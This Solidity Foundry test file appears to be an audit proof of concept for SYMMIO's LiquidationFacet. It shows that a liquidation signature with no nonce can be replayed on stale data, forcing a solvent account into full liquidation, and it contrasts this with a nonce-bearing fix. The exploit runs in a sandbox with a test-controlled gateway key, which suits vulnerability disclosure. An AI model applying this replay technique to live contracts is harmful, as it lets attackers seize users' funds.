// SPDX-License-Identifier: MIT
pragma solidity >=0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

import "../src/symm/contracts/facets/liquidation/LiquidationFacet.sol";
import "../src/symm/contracts/libraries/LibAccount.sol";
import "../src/symm/contracts/libraries/LibAccessibility.sol";
import "../src/symm/contracts/storages/MuonStorage.sol";
import "../src/symm/contracts/storages/MAStorage.sol";
import "../src/symm/contracts/storages/AccountStorage.sol";
import "../src/symm/contracts/storages/GlobalAppStorage.sol";
import "../src/symm/contracts/storages/QuoteStorage.sol";

/// @dev The audited SYMMIO diamond facet, unmodified. `SymmioHarness` inherits the
/// REAL `LiquidationFacet` (so `liquidatePartyA`/`setSymbolsPrice`/
/// `liquidatePositionsPartyA` run the real `LiquidationFacetImpl` + `LibMuon`
/// verification), and only ADDS setup/view helpers that write the real diamond
/// storage layouts through the real storage libraries — exactly the state that
/// `sendQuote`/`openPosition`/`allocate` would have produced. No protocol logic
/// is mocked or overridden.
contract SymmioHarness is LiquidationFacet {
    // ---- setup helpers (establish the real vulnerable precondition) ----
    function grantLiquidator(address who) external {
        GlobalAppStorage.layout().hasRole[who][LibAccessibility.LIQUIDATOR_ROLE] = true;
    }

    function configMuon(uint256 appId, address gateway, uint256 upnlValidTime) external {
        MuonStorage.Layout storage m = MuonStorage.layout();
        m.muonAppId = appId;
        m.validGateway = gateway;
        m.upnlValidTime = upnlValidTime;
    }

    function setPartyABalances(
        address partyA,
        uint256 allocated,
        uint256 cva,
        uint256 mm,
        uint256 lf
    ) external {
        AccountStorage.Layout storage a = AccountStorage.layout();
        a.allocatedBalances[partyA] = allocated;
        a.lockedBalances[partyA] = LockedValues(cva, mm, lf);
    }

    function setPartyANonce(address partyA, uint256 n) external {
        AccountStorage.layout().partyANonces[partyA] = n;
    }

    /// @dev One OPENED position for (partyA, partyB), with the open-position
    /// bookkeeping and partyB balances the real close/liquidate paths expect.
    function setupPosition(
        uint256 quoteId,
        address partyA,
        address partyB,
        uint256 symbolId,
        uint256 quantity,
        uint256 openedPrice,
        uint256 cva,
        uint256 mm,
        uint256 lf
    ) external {
        QuoteStorage.Layout storage q = QuoteStorage.layout();
        Quote storage quote = q.quotes[quoteId];
        quote.id = quoteId;
        quote.symbolId = symbolId;
        quote.positionType = PositionType.LONG;
        quote.orderType = OrderType.LIMIT;
        quote.openedPrice = openedPrice;
        quote.initialOpenedPrice = openedPrice;
        quote.requestedOpenPrice = openedPrice;
        quote.quantity = quantity;
        quote.closedAmount = 0;
        quote.initialLockedValues = LockedValues(cva, mm, lf);
        quote.lockedValues = LockedValues(cva, mm, lf);
        quote.partyA = partyA;
        quote.partyB = partyB;
        quote.quoteStatus = QuoteStatus.OPENED;

        q.partyAOpenPositions[partyA].push(quoteId);
        q.partyAPositionsIndex[quoteId] = 0;
        q.partyAPositionsCount[partyA] = 1;
        q.partyBOpenPositions[partyB][partyA].push(quoteId);
        q.partyBPositionsIndex[quoteId] = 0;
        q.partyBPositionsCount[partyB][partyA] = 1;

        AccountStorage.Layout storage a = AccountStorage.layout();
        a.partyBAllocatedBalances[partyB][partyA] = 1000e18;
        a.partyBLockedBalances[partyB][partyA] = LockedValues(cva, mm, lf);
    }

    // ---- views ----
    function allocatedOf(address who) external view returns (uint256) {
        return AccountStorage.layout().allocatedBalances[who];
    }

    function availableForLiquidation(int256 upnl, address partyA) external view returns (int256) {
        return LibAccount.partyAAvailableBalanceForLiquidation(upnl, partyA);
    }

    function liquidationStatusOf(address partyA) external view returns (bool) {
        return MAStorage.layout().liquidationStatus[partyA];
    }

    function liqDetailUpnl(address partyA) external view returns (int256) {
        return AccountStorage.layout().liquidationDetails[partyA].upnl;
    }

    /// @dev Byte-for-byte mirror of `LibMuon.verifyLiquidationSig`'s signed hash
    /// (the audited nonce-FREE schema) so the test can produce a genuine gateway
    /// signature over it. NOTE: no partyA/partyB nonce appears here — that is the bug.
    function liqSigHash(LiquidationSig memory s, address partyA) external view returns (bytes32) {
        return
            keccak256(
                abi.encodePacked(
                    MuonStorage.layout().muonAppId,
                    s.reqId,
                    s.liquidationId,
                    address(this),
                    "verifyPrices",
                    partyA,
                    s.upnl,
                    s.totalUnrealizedLoss,
                    s.symbolIds,
                    s.prices,
                    s.timestamp,
                    block.chainid
                )
            );
    }

    /// @dev Mirror of `LibMuon.verifyPartyAUpnl`'s signed hash — the nonce-BEARING
    /// schema SYMMIO already uses elsewhere (and the recommended fix): it includes
    /// `partyANonces[partyA]`, so its hash changes when the nonce advances.
    function upnlSigHash(
        bytes memory reqId,
        address partyA,
        int256 upnl,
        uint256 timestamp
    ) external view returns (bytes32) {
        return
            keccak256(
                abi.encodePacked(
                    MuonStorage.layout().muonAppId,
                    reqId,
                    address(this),
                    partyA,
                    AccountStorage.layout().partyANonces[partyA],
                    upnl,
                    timestamp,
                    block.chainid
                )
            );
    }
}

contract PoC_26346 is Test {
    SymmioHarness internal symm;

    address internal constant PARTY_A = address(0xA11CE);
    address internal constant PARTY_B = address(0xB0B);
    address internal constant LIQUIDATOR = address(0xBEEF);

    uint256 internal constant QUOTE_ID = 1;
    uint256 internal constant SYMBOL_ID = 1;

    // The Muon "gateway" oracle key. In production the gateway holds this key and
    // signs off-chain; here the test controls it so we can produce a GENUINELY
    // valid signature. The finding is the SCHEMA (missing nonce), which we prove
    // by replaying a genuinely-valid signature — not by faking verification.
    uint256 internal constant GATEWAY_KEY = 0xC0FFEE;
    address internal gateway;

    function setUp() public {
        symm = new SymmioHarness();
        gateway = vm.addr(GATEWAY_KEY);

        symm.grantLiquidator(LIQUIDATOR);
        symm.configMuon(1, gateway, 1e6);

        // partyA: allocated 109, locked cva=6 / mm=10 / lf=4  (cva+lf = 10)
        symm.setPartyABalances(PARTY_A, 109e18, 6e18, 10e18, 4e18);
        // one open LONG position (100 @ 10) matching those locked values
        symm.setupPosition(QUOTE_ID, PARTY_A, PARTY_B, SYMBOL_ID, 100e18, 10e18, 6e18, 10e18, 4e18);
    }

    /// Build a real LiquidationSig and sign its (nonce-free) hash with the gateway key.
    function _liqSig(int256 upnl, uint256 timestamp) internal view returns (LiquidationSig memory s) {
        uint256[] memory ids = new uint256[](1);
        ids[0] = SYMBOL_ID;
        uint256[] memory px = new uint256[](1);
        px[0] = 9e18;
        s = LiquidationSig({
            reqId: hex"01",
            timestamp: timestamp,
            liquidationId: bytes("liquidation-round-1"),
            upnl: upnl,
            totalUnrealizedLoss: upnl,
            symbolIds: ids,
            prices: px,
            gatewaySignature: hex"",
            sigs: SchnorrSign({signature: 0, owner: address(0), nonce: address(0)})
        });
        bytes32 h = symm.liqSigHash(s, PARTY_A);
        (uint8 v, bytes32 r, bytes32 sg) = vm.sign(GATEWAY_KEY, ECDSA.toEthSignedMessageHash(h));
        s.gatewaySignature = abi.encodePacked(r, sg, v);
    }

    /// Core exploit: a signature signed while partyA was liquidatable is replayed
    /// after partyA has legitimately become solvent (nonce advanced), forcing an
    /// unfair full liquidation that drains partyA's entire allocated balance.
    function testExploit() public {
        // (t0, nonce 0) partyA is liquidatable at upnl = -100. Gateway signs it.
        LiquidationSig memory staleSig = _liqSig(-100e18, block.timestamp);

        // partyA legitimately acts -> partyANonces advances to 1, and partyA's TRUE
        // position is now solvent (real upnl ~= -5). A correct oracle would only
        // sign upnl = -5 now; the view of -100 is stale.
        symm.setPartyANonce(PARTY_A, 1);

        // Prove partyA is genuinely solvent NOW: a fresh, correctly-signed sig with
        // the true upnl is rejected by the real solvency guard.
        LiquidationSig memory freshSig = _liqSig(-5e18, block.timestamp);
        assertGt(symm.availableForLiquidation(-5e18, PARTY_A), 0, "true upnl => solvent");
        vm.prank(LIQUIDATOR);
        vm.expectRevert(bytes("LiquidationFacet: PartyA is solvent"));
        symm.liquidatePartyA(PARTY_A, freshSig);

        // But the STALE sig, signed at nonce 0, STILL passes the real
        // verifyLiquidationSig at nonce 1 (the signed hash omits the nonce) and its
        // stale upnl of -100 makes partyA look liquidatable.
        assertLt(symm.availableForLiquidation(-100e18, PARTY_A), 0, "stale upnl => 'liquidatable'");
        assertEq(symm.allocatedOf(PARTY_A), 109e18);

        vm.prank(LIQUIDATOR);
        symm.liquidatePartyA(PARTY_A, staleSig); // replayed authorization accepted
        assertTrue(symm.liquidationStatusOf(PARTY_A), "solvent partyA forced into liquidation");
        assertEq(symm.liqDetailUpnl(PARTY_A), -100e18, "stale upnl locked into liquidation");

        vm.prank(LIQUIDATOR);
        symm.setSymbolsPrice(PARTY_A, staleSig); // same sig accepted again

        uint256[] memory qs = new uint256[](1);
        qs[0] = QUOTE_ID;
        vm.prank(LIQUIDATOR);
        symm.liquidatePositionsPartyA(PARTY_A, qs);

        // HARM: a partyA who was solvent is fully liquidated — entire 109e18
        // allocated balance seized — purely because the liquidation signature
        // carried no nonce and could be replayed on stale data.
        assertEq(symm.allocatedOf(PARTY_A), 0, "solvent partyA lost entire allocated balance");
    }

    /// Root-cause / fix contrast, at the hash level: the liquidation schema's
    /// signed hash is invariant under the nonce (=> replayable), whereas the
    /// nonce-bearing schema SYMMIO uses elsewhere is not.
    function testSchemaOmitsNonce() public {
        LiquidationSig memory s = _liqSig(-100e18, block.timestamp);

        symm.setPartyANonce(PARTY_A, 0);
        bytes32 liq0 = symm.liqSigHash(s, PARTY_A);
        bytes32 upnl0 = symm.upnlSigHash(hex"01", PARTY_A, -100e18, s.timestamp);

        symm.setPartyANonce(PARTY_A, 1);
        bytes32 liq1 = symm.liqSigHash(s, PARTY_A);
        bytes32 upnl1 = symm.upnlSigHash(hex"01", PARTY_A, -100e18, s.timestamp);

        assertEq(liq0, liq1, "BUG: liquidation signature hash ignores the nonce -> replayable");
        assertTrue(upnl0 != upnl1, "FIX: nonce-bearing schema binds the nonce -> not replayable");
    }
}
